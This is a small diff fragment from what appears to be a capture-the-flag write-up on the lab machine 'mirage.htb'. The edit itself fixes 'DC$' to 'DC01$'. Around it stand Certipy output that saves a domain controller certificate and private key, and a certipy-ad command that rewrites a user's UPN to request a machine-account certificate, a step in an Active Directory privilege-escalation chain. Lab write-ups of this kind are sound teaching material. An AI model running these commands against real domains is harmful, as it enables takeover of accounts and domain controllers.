@@ -897,7 +897,7 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'dc01.pfx'
 ```
 
-Ill then use a TGT of `mark.bbond` to request a certificate for the DC$ machine account
+Ill then use a TGT of `mark.bbond` to request a certificate for the DC01$ machine account
 
 ```python
 ❯❯❯ faketime -f +7h certipy-ad account -u 'mirage-service$@mirage.htb' -k -no-pass -dc-ip '10.129.232.163' -upn 'mark.bbond@mirage.htb' -user 'mark.bbond' update -target dc01.mirage.htb
